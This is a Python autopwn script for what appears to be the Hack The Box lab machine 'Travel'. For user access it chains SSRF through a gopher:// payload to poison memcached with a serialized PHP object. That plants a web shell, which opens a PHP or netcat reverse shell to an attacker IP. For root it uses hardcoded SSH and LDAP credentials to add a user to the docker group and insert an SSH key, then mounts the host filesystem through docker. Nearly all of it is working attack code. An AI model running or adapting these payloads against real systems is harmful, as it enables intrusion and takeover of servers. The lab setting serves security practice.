#!/usr/bin/python3

import requests
import hashlib
import logging
import coloredlogs
import argparse
import string
import random
import time
from Crypto.PublicKey import RSA
from pwn import *

logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG', fmt='%(asctime)s-%(hostname)s-%(message)s', logger=logger)

travelURL = "http://blog.travel.htb/awesome-rss/"
proxyValues = {'http': 'http://127.0.0.1:8888'}
defaultHeaders = {
               "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language":"en-US,en;q=0.5",
               "Accept-Encoding":"gzip, deflate",
}   


def get_args():
	parser =argparse.ArgumentParser(description="Dumpster Autopwn for Travel", usage="python <script>.py -i <ip> -p <port> -t <user|root> -k <id_rsa.pub>", epilog="")
	parser.add_argument('-i','--ip',type=str, help="Attacker IP", required=True)
	parser.add_argument('-p','--port',type=str, help="Attacker Port",required=True)
	parser.add_argument('-t','--target', type=str, help="Our Target", choices=['user', 'root'], required=True)
	parser.add_argument('-k','--key', type=str, help="""Our ID RSA Key if target==root format <filename>. Generate ssh-keygen -m PEM -p -t rsa -C "test@test.com" """ )

	args = parser.parse_args()
	attacker_ip = args.ip
	attacker_port = args.port
	target = args.target
	key_file = args.key
	return attacker_ip,attacker_port,target,key_file


"""
From output of: http://10.10.14.25/rss5.xml
Intermediate hash is: 1919302560153538b7daeeb0b7a3440a
Debug output
<!--
DEBUG
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| xct_5a51ecfc66(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
-->
Final md5 hash should be: 5a51ecfc660715f37936ef3400c0c103
Delimiter is specified in: https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache.php#L83
"""
def calculate_md5(url):
	m = hashlib.md5()
	m.update(url)
	urlmd5 = m.hexdigest()
	m = hashlib.md5()
	textToHash = urlmd5 + ":spc"
	m.update(textToHash)
	return m.hexdigest()

"""Our PHP payload Serilaized payload
<?php
class TemplateHelper{
        public $file = 'ganapati.php';
        public $data = '<?php system($_GET["c"]);?>';
}

echo serialize(new TemplateHelper);

?>

O:14:"TemplateHelper":2:{s:4:"file";s:12:"ganapati.php";s:4:"data";s:27:"<?php system($_GET["c"]);?>";}
keep this at len 8 since ganapati is 8 chars.. we avoid having to re-generate our serialized payloads this way on multiple attempts
"""
def randomString(stringLength=8):
	letters =string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))

"""
Gopherus can help with generating most of our payload.. decodeing gopherus' payload will show us:
gopher://127.0.0.1:11211/_
set SpyD3r 4 0 133
O:14:"TemplateHelper":2:{s:4:"file";s:12:"ganapati.php";s:4:"data";s:27:"<?php system($_GET["c"]);?>";}

However, we notice from the rss_template.php code, that the application looks for a memcached key in the format of xct_<md5hash>
Therefore, we need to do some magic here and replace our randomly file that we generate
"""

def replaceGopher(md5hash,filename):
	serializedPayload = """O:14:"TemplateHelper":2:{s:4:"file";s:12:"ganapati.php";s:4:"data";s:27:"<?php system($_GET["c"]);?>";}"""
	serializedPayload = serializedPayload.replace('PLACEHOLDER', tempfileName)
	#we can generate this with gopherus -- however, the 
	# 		
	gopherPayload= """gopher://Localhost:11211/_%0d%0aset%20xct_<PLACEHOLDER_1>%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22<PLACEHOLDER_2>%22%3Bs:4:%22data%22%3Bs:27:%22%3C%3Fphp%20system%28%24_GET%5B%22c%22%5D%29%3B%3F%3E%22%3B%7D%0d%0a"""
	gopherPayload = gopherPayload.replace("<PLACEHOLDER_1>", md5hash)
	gopherPayload = gopherPayload.replace("<PLACEHOLDER_2>", filename)
	return gopherPayload

if __name__ == "__main__":
	attacker_ip, attacker_port, target, key_file = get_args()
	if target  =="user":
		
		tempfileName = randomString() + ".php"	
		logger.info("[+] We will try to write a file [%s] to /logs directory" % tempfileName)	
		
		url = "http://www.travel.htb/newsfeed/customfeed.xml"
		hashValue = calculate_md5(url)
		print ( "MD5 hash value of url: [%s] is [%s]" % (url,hashValue))

		gopherPayload = replaceGopher (hashValue,tempfileName)
		logger.info("[+] Our SSRF payload will be [%s]" % gopherPayload) 		
		
		data = {"custom_feed_url" : gopherPayload} 
		payloadTravelURL = travelURL+"?custom_feed_url="+gopherPayload
		debugURL = "http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php"
		logger.info("[+] Poisoning memcached with key [xct_%s] using SSRF to include our PHP serialized payload" % hashValue)
		r = requests.get(payloadTravelURL, headers=defaultHeaders, proxies=proxyValues)
		r = requests.get(debugURL,headers=defaultHeaders,proxies=proxyValues)
		r = requests.get(travelURL,headers=defaultHeaders,proxies=proxyValues)
		logger.info("[+] Poisoning complete")
		webshellURL = "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/" + tempfileName 

		payload = "php -r '$sock=fsockopen(\"" + attacker_ip +"\"," + attacker_port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'" 
		#payload = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """ + attacker_ip + " " + attacker_port + ">/tmp/f"
		paramValues = {"c": payload}
		logger.info("[+] Our Reverse shell payload is: %s" %payload )
		l1 = listen(attacker_port)
		time.sleep(3)
		logger.info("[+] Invoking reverse shell to [%s] on port [%s]" %(attacker_ip,attacker_port))
		r = requests.get(webshellURL,headers=defaultHeaders,proxies=proxyValues,params=paramValues)		
		time.sleep(3)
		svr = l1.wait_for_connection()
		
		logger.debug("[+] We are connected! Switching to interactive")
		svr.interactive()
	elif target =="root":

		if not key_file:
			logger.error("[-] Please specify path of public key id_rsa.pub")
			logger.error("""[-] Generate ssh-keygen -m PEM -p -t rsa -C "test@test.com" """)
			exit(0)

		file = open(key_file+".pub", "r")
		public_key = file.readlines()[0]
		file.close()
		#ssh-keygen -m PEM -p -t rsa -C "test@test.com"  
		
		logger.info ("[****] We discovered WP credentials in an .sql script in the previous step. After cracking them lets ssh in...")
		
		s1 = ssh(host = "10.10.10.189",user="lynik-admin", password="1stepcloser" )
		shell = s1.shell('/bin/bash')

		logger.info("[+] We will modify LDAP entries to move lynik UID trvl-admin [uid:1000] and add lynik to the docker group [gid:117]")
		logger.info("[+] Calling ldapmodify to modify lynik's uidNumber to 1000")
		shell.sendline("""ldapmodify -x -w Theroadlesstraveled -D cn=lynik-admin,dc=travel,dc=htb""")
		shell.sendline("""dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb""")
		shell.sendline("""replace: uidNumber""")
		shell.sendline("""uidNumber: 1000""")
		shell.sendline()
		#shell.sendline('\003')

		#we cant use .process since pythons not on the host :(
		#p1 = s1.process(['/usr/bin/ldapmodify', '-x' , '-w' ,'Theroadlesstraveled','-D', 'cn=lynik-admin,dc=travel,dc=htb'] ) 
	
		logger.info("[+] Now modifying lynik's gidNumber to 117")
		shell.sendline("""dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb""")
		shell.sendline("""replace: gidNumber""")
		shell.sendline("""gidNumber: 117""")
		shell.sendline()

		logger.info("[+] Finally, adding lynik's public key to the LDAP entry")
		shell.sendline("""dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb""")
		shell.sendline("""changetype: modify""")
		shell.sendline("""add: objectClass""")

		shell.sendline("""objectClass: ldapPublicKey""")
		shell.sendline()

		shell.sendline("""dn: uid=lynik,ou=users,ou=linux,ou=servers,dc=travel,dc=htb""")
		shell.sendline("""add: sshPublicKey""")
		shell.sendline("sshPublicKey:" + public_key)
		shell.sendline()

		s1.close()
		logger.info("[+] SSH'ing in as lynik with the modifications made to LDAP")
		s2 = ssh(host = "10.10.10.189",user="lynik",keyfile=key_file)

		shell2 = s2.shell('/bin/bash')
		time.sleep(1)
		logger.info("[+] Since we added ourselves to group 117 (docker) lets get to root on the host")
		shell2.sendline("""docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh""")
		time.sleep(1)
		shell2.sendline("""whoami""")
		shell2.interactive()


	

	








